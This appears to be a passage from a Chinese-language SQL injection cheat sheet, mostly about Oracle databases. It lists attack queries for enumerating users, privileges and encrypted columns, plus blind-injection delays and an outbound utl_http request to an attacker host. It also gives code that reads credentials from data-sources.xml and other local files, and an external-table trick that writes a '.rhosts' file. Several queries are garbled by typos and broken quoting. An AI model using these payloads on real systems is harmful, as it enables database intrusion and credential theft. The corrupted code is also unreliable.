&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; mytable &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;dumpfile&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/tmp/hacker&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;Oracle-备忘单&#34;&gt;&lt;a href=&#34;#Oracle-备忘单&#34; class=&#34;headerlink&#34; title=&#34;Oracle 备忘单&#34;&gt;&lt;/a&gt;Oracle 备忘单&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;枚举数据库配置信息和模式&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;提取Oracle服务器的配置信息&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查   询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;版本&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT banner FROM v$version;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;当前用户&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT user FROM dual;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出用户&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT username FROM all users ORDER BY username;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;当前用户权限&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT * FROM user role_privs;&lt;/code&gt; &lt;br&gt;&lt;code&gt;SELECT * FROM user_tab_privs;&lt;/code&gt;&lt;br&gt; &lt;code&gt; SELECT * FROM user_sys_privs;&lt;/code&gt;&lt;br&gt; &lt;code&gt;SELECT sys_context(&#39;USERENV&#39;,&#39;ISDBA&#39;) FROM dual;&lt;/code&gt;&lt;br&gt;&lt;code&gt;SELECT grantee FROM dba_sys_privs WHERE privilege = &#39;SELECT ANY DICTIONARY&#39;;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;应用服务器主机名&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT sys_context(&#39;USERENV&#39;,&#39;HOST&#39;) FROM dual;&lt;/code&gt;&lt;br&gt;&lt;code&gt;SELECT sys_context(&#39;USERENV&#39;,&#39;SERVER_HOST&#39;) FROM dual;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;数据库服务器主机名&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT UTL_INADDR.get_host_name FROM dual&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;建立外部连接&lt;/td&gt;
&lt;td&gt;`SELECT utl_http.request(‘&lt;a href=&#34;http://attacker:1000/&#34;&gt;http://attacker:1000/&lt;/a&gt;‘&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;引发错误&lt;/td&gt;
&lt;td&gt;引发包含版本标志的错误  &lt;br&gt;&lt;code&gt;AND (utl_inaddr.get_host_name((select banner from v$version where rownum=1)))=1&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;提取Oracle数据库的模式信息&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查   询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;数据库名&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT global_name FROM global_name;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出模式/用户&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT username FROM all_users;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出表名及其模式&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT ower,table_name FROM all_users;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出列&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT ower, table_name, column_name FROM all_tab_columns WHERE table_name= &#39;tblUsers&#39;;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;数据库中的加密信息&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查   询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;经过加密的表&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT table_name, column_name,  encryption_alg, salt FROM  dba_encrypted_columns;&lt;/code&gt; &lt;br&gt; 从Oracle 10g开始，可以对表使用透明加密。考虑到性能原因，通常只对最重要的列进行加密&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出使用加密库的对象&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT owner, name, type, referenced_name  FROM all_dependencies;&lt;/code&gt;&lt;br&gt;  显示使用了数据库加密的对象(例如，DBMS_CRYPTO和DBMS_OBFUSCATION_TOOLKIT中的密码)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出包含’crypt’字符串的PL/SQL函数&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT  owner,object_name,procedure_name  FROM all_procedures where  (lower(object_name) LIKE &#39;%crypt%&#39; or lower(procedure_name) like &#39;%crypt%&#39;) AND object_name not in (&#39;DBMS OBFUSCATION  TOOLKIT&#39;,&#39;DBMS_CRYPTO_TOOLKIT&#39;)&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;SQL盲注函数：Oracle&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;SQL盲注函数&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查  询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;字符串长度&lt;/td&gt;
&lt;td&gt;&lt;code&gt;LENGTH()&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;从给定字符串中提 取子串&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT SUBSTR(string,offset,length) FROM dual;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;字符串（’ABC’）不带 单引号的表示方式&lt;/td&gt;
&lt;td&gt;`SELECT chr(65)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;触发时间延迟&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT UTL_INADDR.get_host_address(&#39;nowhere999.zom&#39;) FROM dual;  -- 触发可度量的时间延迟&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;攻击数据库服务器：Oracle&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Oracle中存在两种不同类型的注入：传统SQL注入和PL/SQL注入。在PL/SQL注入中， 可以执行整个PL/SQL块；而在传统的SQL注入中，通常则只能修改单条SQL语句。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;命令执行&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用下列脚本实现系统命令的执行和本地文件的读/写访问:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.0xdeadbeef.infb/exploits/raptor_oraexec.sql&#34;&gt;www.0xdeadbeef.infb/exploits/raptor_oraexec.sql&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql&#34;&gt;www.0xdeadbeef.info/exploits/raptor_oraextproc.sql&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;读本地文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;从Oracle服务器读取本地文件&lt;/p&gt;
&lt;p&gt;读本地文件：XMLType&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt; directory GETPWDIR &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;C:\APP\ROOT\PRODUCT\11.1.0\
DB_1\OWB\J2EE\CONFIG&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; extractvalue&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/connection-factory/@user&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;
extractvalue&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/connection—factory/@password&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;@&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;substr
&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;extractvalue&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/connection-factory/@url&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;instr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;extractvalue
&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/connection-factory/@url&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;//&#39;&#39;)+2) conn
FROM table(
XMLSequence(
extract(
xmltype(
bfilename(&#39;&lt;/span&gt;GETPWDIR&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;sources&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;xml&lt;span class=&#34;token string&#34;&gt;&#39;),
nls_charset_id(&#39;&lt;/span&gt;WE8ISO8859P1&lt;span class=&#34;token string&#34;&gt;&#39;)
)/
&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;sources&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;connection&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;pool&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;connection&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;factory&#39;
&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;读本地文件：Oracle Text&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; files &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;id NUMBER &lt;span class=&#34;token keyword&#34;&gt;PRIMARY&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;KEY&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;path VARCHR&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;UNIQUE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
ot_format &lt;span class=&#34;token keyword&#34;&gt;VARCHAR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; files &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;c:\boot.ini&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 将准备要读取的列插入到表中(比如通过SQL注入读取)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INDEX&lt;/span&gt; file_index &lt;span class=&#34;token keyword&#34;&gt;ON&lt;/span&gt; files&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;path&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; INDEXTYPE &lt;span class=&#34;token operator&#34;&gt;IS&lt;/span&gt; ctxsys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;context
PARAMETERS&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;datastore ctxsys.file_datastore format column ot_format&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 从全文索引检索数据(boot.ini)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; token_text &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dr$fi1e_index$i&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;读本地文件(仅限于PL/SQL注入)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;直接连接到数据库来执行PL/SQL块：&lt;/p&gt;
&lt;p&gt;读本地文件：dbms_lob&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-plsql&#34; data-language=&#34;plsql&#34;&gt;&lt;code class=&#34;language-plsql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;Create&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt; replace &lt;span class=&#34;token keyword&#34;&gt;directory&lt;/span&gt; ext &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;C:\&#39;;
DECLARE
buf varchar2(4096);
BEGIN
Lob_loc:= BFILENAME(1MEDIA_DIR&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;aht.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
DBMS_LOB&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;OPEN&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Lob_loc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; DBMS_LOB&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;LOB_READONLY&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
DBMS_LOB&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;READ&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Lob_loc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;buf&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
dbms_output&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;put_line&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;utl_raw&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cast_to_varchar2&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;buf&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
DBMS_LOB&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;CLOSE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Lob_loc&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; via &lt;span class=&#34;token keyword&#34;&gt;external&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; products_ext
&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;prod_id NUMBER&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; prod_name VARCHAR2&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; prod_desc VARCHAR2&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
prod_category VARCHAR2&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; prod_category_desc VARCHAR2&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
list_price NUMBER&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; min_price NUMBER&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; last_updated &lt;span class=&#34;token keyword&#34;&gt;DATE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;ORGANIZATION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;EXTERNAL&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;TYPE&lt;/span&gt; oracle_loader
&lt;span class=&#34;token keyword&#34;&gt;DEFAULT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;DIRECTORY&lt;/span&gt; stage_dir
ACCESS &lt;span class=&#34;token keyword&#34;&gt;PARAMETERS&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;RECORDS DELIMITED &lt;span class=&#34;token keyword&#34;&gt;BY&lt;/span&gt; NEWLINE
BADFILE ORAHOME&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;.rhosts&#39;&lt;/span&gt;
LOGFILE ORAHOME&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;log_products_ext&#39;&lt;/span&gt;
FIELDS TERMINATED &lt;span class=&#34;token keyword&#34;&gt;BY&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;
MISSING FIELD &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; ARE &lt;span class=&#34;token keyword&#34;&gt;NULL&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;prod_id&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; prod_name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; prod_desc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; prod_category&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; prod_category_desc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; price&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; price_delta&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;last_updated &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; date_format &lt;span class=&#34;token keyword&#34;&gt;date&lt;/span&gt; mask &lt;span class=&#34;token string&#34;&gt;&#34;dd-mon-yyyy&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
LOCATION &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;data.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
PARALLEL &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;
REJECT &lt;span class=&#34;token keyword&#34;&gt;LIMIT&lt;/span&gt; UNLIMITED&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;写本地文件(仅限于PL/SQL注入)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过SQL*Plus等客户端来直接连接到数据库。&lt;/p&gt;
&lt;p&gt;写本地文本文件：utl_file&lt;/p&gt;
